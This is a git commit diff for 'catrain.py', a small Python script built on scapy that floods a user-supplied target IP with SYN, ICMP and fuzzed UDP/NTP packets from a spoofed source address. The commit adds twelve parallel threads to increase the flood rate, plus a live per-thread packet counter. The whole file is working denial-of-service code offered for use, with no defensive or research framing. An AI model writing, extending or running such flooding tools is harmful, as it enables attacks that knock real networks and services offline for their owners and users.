320813f6867cd74396b2dfbf65b8e9efede881e6
LmaosDev <lmaos@duck.com>
2025-03-27 22:40:52 +1300

    Update catrain.py
    managed fix with threads :3 🥇

--- catrain.py
+++ catrain.py
@@ -1,22 +1,47 @@
 print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<") 
 
-from scapy.all import IP, TCP, ICMP, UDP, NTP, send, RawVal, fuzz # type: ignore // pip install scapy --python C:\path\to\python 
+import subprocess as s; from threading import Thread; from time import sleep; from os import name as osname;
+
+try:
+	if b"scapy" not in s.check_output("pip list", shell=True):
+		s.call("pip install scapy", shell=True) 
+finally: 0 
 
 target_ip = input("IP: ") 
 count = int(input("Count: ")) 
 srcIp = input("Source IP (opt): ") 
+if not srcIp:
+	srcIp = "192.168.2.34" 
 
-if srcIp != "":
-    packetT = IP(dst=target_ip, src="192.168.2.34") / TCP(flags="S") 
-else: packetT = IP(dst=target_ip, src=srcIp) / TCP(flags="S") 
-packetI = IP(dst=target_ip, src="192.168.2.34") / ICMP() 
-packetU = IP(dst=target_ip, src="192.168.2.34") / fuzz(UDP()/NTP()) 
+rno = [True] * 12 
+rcount = [0] * 12 
 
-sent_count = 0 
-for i in range(count):
-    send(packetT) 
-    send(packetI) 
-    send(packetU) 
-    sent_count += 1 
-    print(f"Sent packet run #{sent_count} to IP {target_ip}") 
-input("All sent~~") 
+from scapy.all import IP, TCP, ICMP, UDP, NTP, send, fuzz 
+
+def scr(number):
+	packetT = IP(dst=target_ip, src=srcIp) / TCP(flags='S') 
+	packetI = IP(dst=target_ip, src=srcIp) / ICMP() 
+	packetU = IP(dst=target_ip, src=srcIp) / fuzz(UDP() / NTP()) 
+	for i in range(count):
+		send(packetT, verbose=0); send(packetI, verbose=0); send(packetU, verbose=0) 
+		rcount[number] += 1 
+	rno[number] = False 
+
+threads = [] 
+for x in range(12):
+	t = Thread(target=scr, args=(x,)); t.start() 
+	threads.append(t); print(f"called sub {x+1}") 
+
+while any(rno):
+	sleep(0.2) 
+	if osname == "nt": s.call("cmd.exe /S /C cls", shell=True) 
+	else: s.call("clear", shell=True) 
+	status_lines = [] 
+	status_lines.append("SUBP no.| Running\t| Packets sent\t| Packet run no.") 
+	status_lines.append("¨" * 56) 
+	for i in range(12): status_lines.append(f"{i+1}.\t| {rno[i]}\t\t| {str(rcount[i]*3).zfill(8)}\t| {str(rcount[i]).zfill(8)}") 
+	print("\n".join(status_lines)) 
+	sleep(0.3) 
+
+input("\nAll sent~~") 
+
